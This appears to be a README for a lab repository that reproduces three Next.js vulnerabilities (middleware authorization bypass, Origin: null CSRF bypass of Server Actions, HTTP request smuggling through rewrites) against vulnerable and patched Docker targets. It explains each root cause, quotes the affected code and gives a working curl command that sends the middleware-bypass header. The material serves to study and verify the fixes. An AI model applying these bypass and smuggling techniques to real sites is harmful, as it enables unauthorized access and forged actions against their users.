# Next.js CVE Proof of Concept

This repository contains reproducible proof-of-concept environments for three Next.js vulnerabilities. Each PoC includes a vulnerable target, a fixed target, and a script that demonstrates the behavioral difference between the two.

The goal of this project is to make the root cause and practical impact of each issue easy to observe in a minimal environment.

## Included Vulnerabilities

| CVE | Advisory | Impact | Vulnerable Version | Fixed Version |
| --- | --- | --- | --- | --- |
| `CVE-2025-29927` | [GHSA-f82v-jwr5-mffw](https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw) | authorization bypass when access control relies only on middleware | `15.2.2` | `15.2.3` |
| `CVE-2026-27978` | [GHSA-mq59-m269-xvcx](https://github.com/vercel/next.js/security/advisories/GHSA-mq59-m269-xvcx) | `Origin: null` bypass of Server Actions CSRF checks | `16.1.6` | `16.1.7` |
| `CVE-2026-29057` | [GHSA-ggv3-7p47-pfv8](https://github.com/advisories/GHSA-ggv3-7p47-pfv8) | HTTP request smuggling through rewrites to an external backend | `15.5.12` | `15.5.13` |

## Release Commits and Patch Commits

The hashes below are taken from upstream `vercel/next.js`.

| CVE | Vulnerable Release Commit | Fixed Release Commit | Relevant Patch Commit |
| --- | --- | --- | --- |
| `CVE-2025-29927` | `v15.2.2` -> `f4552826e1ed15fbeb951be552d67c5a08ad0672` | `v15.2.3` -> `535e26d3c69de49df8bd17618a424cbe65ec897b` | `52a078da3884efe6501613c7834a3d02a91676d2` |
| `CVE-2026-27978` | `v16.1.6` -> `adf8c612adddd103647c90ff0f511ea35c57076e` | `v16.1.7` -> `bdf3e3577a6d55ea186a48238d61fbd8da07a626` | `a27a11d78e748a8c7ccfd14b7759ad2b9bf097d8` |
| `CVE-2026-29057` | `v15.5.12` -> `d23f41c42506005fe6978e076a1ccbf8979e4925` | `v15.5.13` -> `cfd5f533b08df3038476dcd54f1d6d660d85f069` | `dc98c04f376c6a1df76ec3e0a2d07edf4abdabd6` |

## Repository Layout

```text
.
|- docker-compose.yml
|- pocs/
|  |- cve-2025-29927/
|  |- cve-2026-27978/
|  `- cve-2026-29057/
`- scripts/
   |- run-cve-2025-29927.mjs
   |- run-cve-2026-27978.mjs
   `- run-cve-2026-29057.mjs
```

## Prerequisites

1. Install Docker Desktop or Docker Engine.
2. Ensure `docker compose` is available.
3. Run commands from the root of this repository.

## Start All Services

```bash
docker compose up --build
```

Exposed ports:

- `3001` -> `CVE-2025-29927` vulnerable
- `3002` -> `CVE-2025-29927` fixed
- `3003` -> `CVE-2026-27978` vulnerable
- `3004` -> `CVE-2026-27978` fixed
- `3005` -> `CVE-2026-29057` vulnerable
- `3006` -> `CVE-2026-29057` fixed

## Reproduce 1: CVE-2025-29927

### Vulnerable Code Path

In this PoC, `/dashboard` is protected only by middleware:

```js
export function middleware(request) {
  const session = request.cookies.get('session')?.value

  if (session !== 'admin') {
    return NextResponse.redirect(new URL('/login', request.url))
  }

  return NextResponse.next()
}
```

The authorization check itself is not incorrect. The issue is that the route depends entirely on the assumption that middleware execution cannot be skipped.

In affected Next.js versions, external requests could still supply the internal header `x-middleware-subrequest`, and the runtime treated that value as trusted middleware metadata. The relevant vulnerable logic was:

```ts
const INTERNAL_HEADERS = [
  'x-middleware-rewrite',
  'x-middleware-redirect',
  'x-middleware-set-cookie',
  'x-middleware-skip',
  'x-middleware-override-headers',
  'x-middleware-next',
  'x-now-route-matches',
  'x-matched-path',
]

export const filterInternalHeaders = (headers) => {
  for (const header in headers) {
    if (INTERNAL_HEADERS.includes(header)) {
      delete headers[header]
    }
  }
}
```

`x-middleware-subrequest` was not filtered there, so attacker-controlled input could reach the middleware runtime. That value was then used to derive recursion depth:

```ts
const subreq = params.request.headers['x-middleware-subrequest']
const subrequests = typeof subreq === 'string' ? subreq.split(':') : []

const depth = subrequests.reduce(
  (acc, curr) => (curr === params.name ? acc + 1 : acc),
  0
)

if (depth >= MAX_RECURSION_DEPTH) {
  return {
    response: new Response(null, {
      headers: {
        'x-middleware-next': '1',
      },
    }),
  }
}
```

If an attacker sends `middleware:middleware:middleware:middleware:middleware`, the runtime may conclude that recursion depth has already been reached and forward the request without executing the application middleware.

### Run

```bash
docker compose up --build cve-2025-29927-vuln cve-2025-29927-fixed
```

```bash
node scripts/run-cve-2025-29927.mjs http://localhost:3001
node scripts/run-cve-2025-29927.mjs http://localhost:3002
```

Expected behavior:

- `3001` returns a redirect without the exploit header, but returns `200 OK` with `x-middleware-subrequest`.
- `3002` continues to redirect to `/login` because the internal header is no longer trusted from external input.

## Reproduce 2: CVE-2026-27978

### Vulnerable Code Path

This PoC exposes a normal Server Action that changes server-side state:

```js
'use server'

import { cookies } from 'next/headers'
import { revalidatePath } from 'next/cache'
import { recordTransfer } from '../lib/state'

export async function transferFunds(formData) {
  const cookieStore = await cookies()
  const session = cookieStore.get('session')?.value

  if (!session) {
    throw new Error('Victim session cookie is missing.')
  }

  const amount = Number(formData.get('amount') || '0')
  recordTransfer(session, amount)
  revalidatePath('/')
}
```

The issue is not in `transferFunds()` itself. The vulnerable behavior was in Next.js CSRF validation for Server Actions. In affected versions, `Origin: null` was treated like a missing origin instead of an explicit opaque origin:

```ts
const originHeader = req.headers['origin']
const originDomain =
  typeof originHeader === 'string' && originHeader !== 'null'
    ? new URL(originHeader).host
    : undefined

const host = parseHostHeader(req.headers)

if (!originDomain) {
  warning = 'Missing `origin` header from a forwarded Server Actions request.'
} else if (!host || originDomain !== host.value) {
  if (isCsrfOriginAllowed(originDomain, serverActions?.allowedOrigins)) {
    // Ignore it
  } else {
    const error = new Error('Invalid Server Actions request.')
    // ...
  }
}
```

Because `'null'` became `undefined`, requests from opaque origins such as sandboxed iframes could avoid the host/origin comparison path and still be processed with victim cookies attached.

### Run

```bash
docker compose up --build cve-2026-27978-vuln cve-2026-27978-fixed
```

```bash
node scripts/run-cve-2026-27978.mjs http://localhost:3003
node scripts/run-cve-2026-27978.mjs http://localhost:3004
```

Expected behavior:

- the script logs in as the victim, extracts the generated Server Action field from the page, and submits it with `Origin: null`
- on the vulnerable target, transfer state changes
- on the fixed target, the request fails and state remains unchanged

## Reproduce 3: CVE-2026-29057

### Vulnerable Code Path

This PoC rewrites `/rewrites/:path*` to an external backend:

```js
/** @type {import('next').NextConfig} */
const nextConfig = {
  async rewrites() {
    return [
      {
        source: '/rewrites/:path*',
        destination: 'http://127.0.0.1:4000/rewrites/:path*',
      },
    ]
  },
}

module.exports = nextConfig
```

The vulnerable behavior was in the vendored `http-proxy` dependency used by Next.js for rewrites. In affected versions, the proxy logic for `DELETE` and `OPTIONS` requests could add `content-length: 0` and remove `transfer-encoding`:

```js
deleteLength: function deleteLength(req, res, options) {
  if (
    (req.method === 'DELETE' || req.method === 'OPTIONS') &&
    !req.headers['content-length']
  ) {
    req.headers['content-length'] = '0'
    delete req.headers['transfer-encoding']
  }
},
```

That created a request-boundary disagreement between the proxy chain and the backend when a crafted chunked request was forwarded. As a result, a second request could be smuggled to the backend over the same connection.

### Run

```bash
docker compose up --build cve-2026-29057-vuln cve-2026-29057-fixed
```

```bash
node scripts/run-cve-2026-29057.mjs http://localhost:3005
node scripts/run-cve-2026-29057.mjs http://localhost:3006
```

Expected behavior:

- the script resets observed state, then sends a raw chunked `DELETE /rewrites/poc` request containing a smuggled `GET /secret`
- on the vulnerable target, the backend records both `DELETE /rewrites/poc` and `GET /secret`
- on the fixed target, the backend records only the first rewritten request

Observed example output:

```text
$ node scripts/run-cve-2026-29057.mjs http://localhost:3005
[before] {"backendRequests":[]}
[after] {"backendRequests":["DELETE /rewrites/poc","GET /secret"]}
PoC result: vulnerable behavior reproduced.

$ node scripts/run-cve-2026-29057.mjs http://localhost:3006
[before] {"backendRequests":[]}
[after] {"backendRequests":["DELETE /rewrites/poc"]}
PoC result: smuggled request was not observed. This usually means the target is patched.
```

## Quick Manual Commands

### CVE-2025-29927

```bash
curl -i http://localhost:3001/dashboard
curl -i -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" http://localhost:3001/dashboard
```

### CVE-2026-27978

Use the provided script, because the Server Action field is generated dynamically by the server.

### CVE-2026-29057

Use the provided script, because the exploit relies on a raw TCP payload with a smuggled second request.

## Sources

- [Next.js Security Advisories](https://github.com/vercel/next.js/security/advisories)
- [CVE-2025-29927 advisory](https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw)
- [Postmortem on the middleware bypass](https://vercel.com/blog/postmortem-on-next-js-middleware-bypass)
- [CVE-2026-27978 advisory](https://github.com/vercel/next.js/security/advisories/GHSA-mq59-m269-xvcx)
- [CVE-2026-29057 advisory](https://github.com/advisories/GHSA-ggv3-7p47-pfv8)
- [CVE-2026-29057 patch commit](https://github.com/vercel/next.js/commit/dc98c04f376c6a1df76ec3e0a2d07edf4abdabd6)
